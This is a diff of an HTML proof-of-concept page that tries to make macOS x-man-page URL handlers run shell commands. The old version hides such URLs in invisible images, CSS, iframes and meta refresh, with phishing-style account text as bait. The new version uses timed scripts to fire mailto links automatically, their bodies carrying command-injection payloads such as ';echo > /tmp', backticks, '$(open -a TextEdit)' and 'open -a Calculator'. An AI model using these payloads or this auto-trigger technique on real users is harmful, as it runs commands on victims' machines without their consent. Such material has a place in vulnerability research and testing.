@@ -1,57 +1,67 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Auto-Preview Exploit Test</title>
+    <title>mailto + x-man-page Auto-Trigger Exploit</title>
 </head>
 <body>
-    <h1>Important Email Preview Test</h1>
+    <h1>mailto Auto-Trigger Test</h1>
     
-    <!-- Test 1: Hidden image with man page URL -->
-    <img src="x-man-page://open%20-a%20Calculator" 
-         width="1" height="1" 
-         style="position:absolute; left:-100px;"
-         alt="hidden">
-    
-    <!-- Test 2: CSS background with man page URL -->
-    <div style="background-image: url('x-man-page://ls;echo CSS_BACKGROUND'); 
-                width: 1px; height: 1px; overflow: hidden;">
-    </div>
-    
-    <!-- Test 3: Object tag -->
-    <object data="x-man-page://test" 
-            type="text/plain"
-            style="display:none">
-    </object>
-    
-    <!-- Test 4: Embed tag -->
-    <embed src="x-man-page://embed_test" 
-           style="display:none">
-    
-    <!-- Test 5: Iframe (less likely but worth testing) -->
-    <iframe src="x-man-page://iframe_test" 
-            style="display:none"
-            onload="console.log('iframe loaded')">
-    </iframe>
-    
-    <!-- Test 6: JavaScript that might run during preview -->
+    <!-- Test 1: Auto-trigger mailto on page load -->
     <script>
-        // Some email clients might execute simple scripts during preview
-        console.log('Preview script executed');
+        // Auto-trigger immediately
+        setTimeout(function() {
+            window.location.href = "mailto:test@test.com?body=Check%20this%20man%20page:%20x-man-page://ls;echo%20AUTO_TRIGGER1%20%3E%20%2Ftmp%2Fauto1.txt";
+        }, 100);
     </script>
     
-    <!-- Test 7: Meta refresh -->
-    <meta http-equiv="refresh" content="0;url=x-man-page://meta_refresh">
+    <!-- Test 2: Multiple auto-triggers -->
+    <script>
+        // Second auto-trigger
+        setTimeout(function() {
+            window.open("mailto:test@test.com?body=x-man-page://open%20-a%20Calculator", "_blank");
+        }, 2000);
+    </script>
     
-    <!-- Test 8: Link tag -->
-    <link rel="stylesheet" href="x-man-page://link_tag">
+    <!-- Test 3: Third auto-trigger with different payload -->
+    <script>
+        setTimeout(function() {
+            window.location.href = "mailto:test@test.com?subject=Urgent&body=x-man-page://`touch%20%2Ftmp%2Fauto2.txt`";
+        }, 4000);
+    </script>
     
-    <!-- Visible content to make email look legitimate -->
-    <p>Please review the attached document. This email contains important information about your account.</p>
-    <p>If you have any questions, please contact support.</p>
+    <!-- Test 4: Hidden iframe auto-trigger -->
+    <iframe src="about:blank" id="hiddenFrame" style="display:none"></iframe>
+    <script>
+        setTimeout(function() {
+            document.getElementById('hiddenFrame').src = "mailto:test@test.com?body=x-man-page://$(open%20-a%20TextEdit)";
+        }, 6000);
+    </script>
     
-    <!-- Normal-looking link that might be auto-activated -->
-    <a href="x-man-page://normal_link" style="color: blue; text-decoration: underline;">
-        Click here to view document
+    <!-- Test 5: Continuous triggers -->
+    <script>
+        let triggerCount = 0;
+        function continuousTrigger() {
+            if (triggerCount < 3) {
+                window.open(`mailto:test@test.com?body=Continuous%20${triggerCount}:%20x-man-page://ls;echo%20CONTINUOUS_${triggerCount}%20%3E%20%2Ftmp%2Fcontinuous.txt`, "_mail" + triggerCount);
+                triggerCount++;
+                setTimeout(continuousTrigger, 1500);
+            }
+        }
+        setTimeout(continuousTrigger, 8000);
+    </script>
+
+    <!-- Visible content -->
+    <p>This page automatically triggers multiple mailto links with x-man-page injections.</p>
+    <p>Check Terminal and /tmp/ for success indicators.</p>
+    
+    <!-- Manual triggers as backup -->
+    <a href="mailto:test@test.com?body=Manual%20trigger:%20x-man-page://ls;echo%20MANUAL%20%3E%20%2Ftmp%2Fmanual.txt" style="color: blue;">
+        Manual Trigger (backup)
     </a>
+
+    <script>
+        console.log("Auto-trigger mailto exploit started");
+        console.log("Triggers scheduled at: 0.1s, 2s, 4s, 6s, 8s+");
+    </script>
 </body>
 </html>
